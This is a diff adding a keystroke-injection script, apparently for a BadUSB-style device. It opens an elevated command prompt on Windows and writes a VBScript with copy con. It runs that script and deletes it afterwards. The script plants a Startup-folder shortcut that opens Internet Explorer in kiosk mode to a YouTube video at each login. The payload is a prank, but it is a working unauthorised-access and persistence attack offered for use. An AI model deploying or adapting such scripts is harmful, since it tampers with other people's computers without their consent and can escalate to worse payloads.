@@ -1,0 +1,38 @@
+Delay 1000
+PressKey KEY_GUI_LEFT
+Delay 2000
+Print cmd
+Delay 2000
+PressModKey MOD_SHIFT_LEFT KEY_F10
+Delay 3000
+PressKey KEY_ARROW_DOWN
+Delay 4000
+PressKey KEY_ENTER
+Delay 3000
+PressKey KEY_ARROW_LEFT
+Delay 4000
+PressKey KEY_ENTER
+Delay 3000
+PrintLine copy con YouveBeenUglyRolled.vbs
+Delay 2000
+PrintLine Set WshShell = WScript.CreateObject("WScript.Shell"):
+Delay 2000
+PrintLine StrMyStartUp = WshShell.SpecialFolders("Startup"):
+Delay 2000
+PrintLine Set lnk = WshShell.CreateShortcut(StrMyStartUp + "\YouveBeenUglyRolled.lnk"):
+Delay 2000
+PrintLine lnk.TargetPath = "%programfiles(x86)%\Internet Explorer\iexplore.exe":
+Delay 2000
+PrintLine lnk.Arguments = "-K http://www.youtube.com/v/XYYo3T6nCw8?autoplay=1":
+Delay 2000
+PrintLine lnk.Save
+Delay 2000
+PressModKey MOD_CTRL_LEFT KEY_Z
+Delay 2000
+PressKey KEY_ENTER
+Delay 2000
+PrintLine YouveBeenUglyRolled.vbs
+Delay 2000
+PrintLine del YouveBeenUglyRolled.vbs
+Delay 2000
+PrintLine exit
